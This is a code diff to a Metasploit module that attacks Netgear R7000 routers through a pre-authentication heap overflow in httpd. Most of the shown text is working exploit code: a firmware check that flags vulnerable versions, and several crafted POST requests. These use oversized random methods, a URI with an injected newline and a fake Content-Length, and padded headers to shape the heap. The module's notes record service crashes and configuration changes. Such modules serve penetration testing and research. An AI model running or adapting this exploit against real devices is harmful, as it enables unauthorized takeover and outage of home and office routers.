@@ -36,6 +36,12 @@ class MetasploitModule < Msf::Auxiliary
         'Targets' => [
           [ 'Netgear R7000', {} ]
         ],
+        'Notes' =>
+          {
+            'Reliability' => [ REPEATABLE_SESSION ],
+            'Stability' => [ CRASH_SERVICE_DOWN ],
+            'SideEffects' => [ CONFIG_CHANGES ]
+          },
         'References' =>
           [
             [ 'URL', 'https://ssd-disclosure.com/ssd-advisory-netgear-nighthawk-r7000-httpd-preauth-rce/'],
@@ -61,13 +67,15 @@ class MetasploitModule < Msf::Auxiliary
   def check_vuln_firmware
     res = send_request_cgi({ 'uri' => '/MNU_access_login_top.htm' })
     if res.nil?
-      return CheckCode::Unknown('Connection timed out.')
+      return Exploit::CheckCode::Unknown('Connection timed out.')
     end
+
     data = res.to_s
     firmware_version = data.match(%r{<b>Firmware Version</b><br>V(\d+\.\d+\.\d+\.\d+)})
     if firmware_version.nil?
-      return CheckCode::Unknown('Could not retrieve firmware version!')
+      return Exploit::CheckCode::Unknown('Could not retrieve firmware version!')
     end
+
     firmware_version = Rex::Version.new(firmware_version[1])
     if firmware_version <= Rex::Version.new('1.0.11.116') || firmware_version == Rex::Version.new('1.0.11.208') || firmware_version == Rex::Version.new('1.0.11.204')
       return true
@@ -80,8 +88,9 @@ class MetasploitModule < Msf::Auxiliary
   def check
     res = send_request_cgi({ 'uri' => '/' })
     if res.nil?
-      return CheckCode::Unknown('Connection timed out.')
+      return Exploit::CheckCode::Unknown('Connection timed out.')
     end
+
     # Checks for the `WWW-Authenticate` header in the response
     if res.headers['WWW-Authenticate']
       data = res.to_s
@@ -92,11 +101,11 @@ class MetasploitModule < Msf::Auxiliary
       if model == 'R7000' && check_vuln_firmware
         return Exploit::CheckCode::Vulnerable
       end
-      return Exploit::CheckCode::Safe
+
     else
       print_error('Router is not a NETGEAR router')
-      return Exploit::CheckCode::Safe
     end
+    return Exploit::CheckCode::Safe
   end
 
   def fake_logins_to_ease_heap
@@ -138,10 +147,10 @@ class MetasploitModule < Msf::Auxiliary
 
     res = send_request_cgi({
       'method' => "#{Rex::Text.rand_text_alpha(58698)}POST",
-      'uri' => normalize_uri('cgi-bin', "genie.cgi?backup.cgi\nContent-Length: 4156559"),
+      'uri' => normalize_uri('cgi-bin', "genie.cgi?backup.cgi\nContent-Length: 4156559"), # Note that we need this format for Content-Length otherwise the exploitation will fail :/
       'ctype' => "multipart/form-data; boundary=#{post_data.bound}",
       'agent' => nil, # Disable sending the User-Agent header
-      'headers' => { 'Content-Disposition' => "form-data\r\n#{Rex::Text.rand_text_alpha(512)}: #{Rex::Text.rand_text_alpha(9)}", 'Host' => "#{datastore['RHOST']}:#{datastore['RPORT']}" },
+      'headers' => { 'Content-Disposition' => 'form-data', Rex::Text.rand_text_alpha(512) => Rex::Text.rand_text_alpha(9), 'Host' => "#{datastore['RHOST']}:#{datastore['RPORT']}" },
       'data' => send_data
     })
 
@@ -155,10 +164,10 @@ class MetasploitModule < Msf::Auxiliary
 
     res = send_request_cgi({
       'method' => "#{Rex::Text.rand_text_alpha(58706)}POST",
-      'uri' => normalize_uri('cgi-bin', "genie.cgi?backup.cgi\nContent-Length: 4156559"),
+      'uri' => normalize_uri('cgi-bin', "genie.cgi?backup.cgi\nContent-Length: 4156559"), # Note that we need this format for Content-Length otherwise the exploitation will fail :/
       'ctype' => "multipart/form-data; boundary=#{post_data.bound}",
       'agent' => nil, # Disable sending the User-Agent header
-      'headers' => { 'Content-Disposition' => "form-data\r\n#{Rex::Text.rand_text_alpha(512)}: #{Rex::Text.rand_text_alpha(9)}", 'Host' => "#{datastore['RHOST']}:#{datastore['RPORT']}" },
+      'headers' => { 'Content-Disposition' => 'form-data', Rex::Text.rand_text_alpha(512) => Rex::Text.rand_text_alpha(9), 'Host' => "#{datastore['RHOST']}:#{datastore['RPORT']}" },
       'data' => send_data
     })
 
@@ -173,10 +182,10 @@ class MetasploitModule < Msf::Auxiliary
 
     res = send_request_cgi({
       'method' => "#{Rex::Text.rand_text_alpha(58667)}POST",
-      'uri' => normalize_uri('cgi-bin', "genie.cgi?backup.cgi\nContent-Length: 4156559"),
+      'uri' => normalize_uri('cgi-bin', "genie.cgi?backup.cgi\nContent-Length: 4156559"), # Note that we need this format for Content-Length otherwise the exploitation will fail :/
       'ctype' => "multipart/form-data; boundary=#{post_data.bound}",
       'agent' => nil, # Disable sending the User-Agent header
-      'headers' => { 'Content-Disposition' => "form-data\r\n#{Rex::Text.rand_text_alpha(512)}: #{Rex::Text.rand_text_alpha(9)}", 'Host' => "#{datastore['RHOST']}:#{datastore['RPORT']}" },
+      'headers' => { 'Content-Disposition' => 'form-data', Rex::Text.rand_text_alpha(512) => Rex::Text.rand_text_alpha(9), 'Host' => "#{datastore['RHOST']}:#{datastore['RPORT']}" },
       'data' => send_data
     })
 
@@ -209,10 +218,10 @@ class MetasploitModule < Msf::Auxiliary
 
     res = send_request_cgi({
       'method' => "#{Rex::Text.rand_text_alpha(58698)}POST",
-      'uri' => normalize_uri('cgi-bin', "genie.cgi?backup.cgi\nContent-Length: 4156559"),
+      'uri' => normalize_uri('cgi-bin', "genie.cgi?backup.cgi\nContent-Length: 4156559"), # Note that we need this format for Content-Length otherwise the exploitation will fail, most likely due to a bad heap layout.
       'ctype' => "multipart/form-data; boundary=#{post_data.bound}",
       'agent' => nil, # Disable sending the User-Agent header
-      'headers' => { 'Content-Disposition' => "form-data\r\n#{Rex::Text.rand_text_alpha(512)}: #{Rex::Text.rand_text_alpha(9)}", 'Host' => "#{datastore['RHOST']}:#{datastore['RPORT']}" },
+      'headers' => { 'Content-Disposition' => 'form-data', Rex::Text.rand_text_alpha(512) => Rex::Text.rand_text_alpha(9), 'Host' => "#{datastore['RHOST']}:#{datastore['RPORT']}" },
       'data' => send_data
     })
 
@@ -263,10 +272,10 @@ class MetasploitModule < Msf::Auxiliary
 
     res = send_request_cgi({
       'method' => "#{Rex::Text.rand_text_alpha(58663)}POST",
-      'uri' => normalize_uri('cgi-bin', "genie.cgi?backup.cgi\nContent-Length: 4156559"),
+      'uri' => normalize_uri('cgi-bin', "genie.cgi?backup.cgi\nContent-Length: 4156559"), # Note that we need this format for Content-Length otherwise the exploitation will fail, most likely due to a bad heap layout.
       'ctype' => "multipart/form-data; boundary=#{post_data.bound}",
       'agent' => nil, # Disable sending the User-Agent header
-      'headers' => { 'Content-Disposition' => "form-data\r\n#{Rex::Text.rand_text_alpha(512)}: #{Rex::Text.rand_text_alpha(9)}", 'Host' => "#{datastore['RHOST']}:#{datastore['RPORT']}" },
+      'headers' => { 'Content-Disposition' => 'form-data', Rex::Text.rand_text_alpha(512) => Rex::Text.rand_text_alpha(9), 'Host' => "#{datastore['RHOST']}:#{datastore['RPORT']}" },
       'data' => send_data
     })
 
@@ -281,10 +290,10 @@ class MetasploitModule < Msf::Auxiliary
 
     res = send_request_cgi({
       'method' => "#{Rex::Text.rand_text_alpha(58746)}POST",
-      'uri' => normalize_uri('cgi-bin', "genie.cgi?backup.cgi\nContent-Length: 4156559"),
+      'uri' => normalize_uri('cgi-bin', "genie.cgi?backup.cgi\nContent-Length: 4156559"), # Note that we need this format for Content-Length otherwise the exploitation will fail, most likely due to a bad heap layout.
       'ctype' => "multipart/form-data; boundary=#{post_data.bound}",
       'agent' => nil, # Disable sending the User-Agent header
-      'headers' => { 'Content-Disposition' => "form-data\r\n#{Rex::Text.rand_text_alpha(512)}: #{Rex::Text.rand_text_alpha(9)}", 'Host' => "#{datastore['RHOST']}:#{datastore['RPORT']}" },
+      'headers' => { 'Content-Disposition' => 'form-data', Rex::Text.rand_text_alpha(512) => Rex::Text.rand_text_alpha(9), 'Host' => "#{datastore['RHOST']}:#{datastore['RPORT']}" },
       'data' => send_data
     })
 
